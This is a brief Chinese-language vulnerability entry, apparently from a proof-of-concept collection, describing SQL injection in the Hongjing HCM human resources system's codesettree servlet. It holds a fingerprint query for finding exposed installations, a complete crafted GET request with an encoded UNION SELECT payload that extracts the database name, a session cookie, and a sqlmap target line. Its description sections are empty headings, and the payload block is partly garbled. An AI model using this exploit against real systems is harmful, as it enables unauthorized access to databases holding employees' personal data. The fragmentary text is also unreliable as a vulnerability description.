# 宏景人力资源信息管理系统codesettree存在SQL注入漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=1&categories=~31~27~20union~20all~20select~20~27~31~27~2cdb~5fname~28~29~2d~2d~20 HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=201281DC1EF63C7855CA781A710216C3`

**请求体 / payload**
```

sqlmap
/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=1&categories=1
\[ehrSafeCodeEncode.py]\(公众号：渗透安全HackTwo\

```

**其他**
- 宏景人力资源信息管理系统codesettree存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统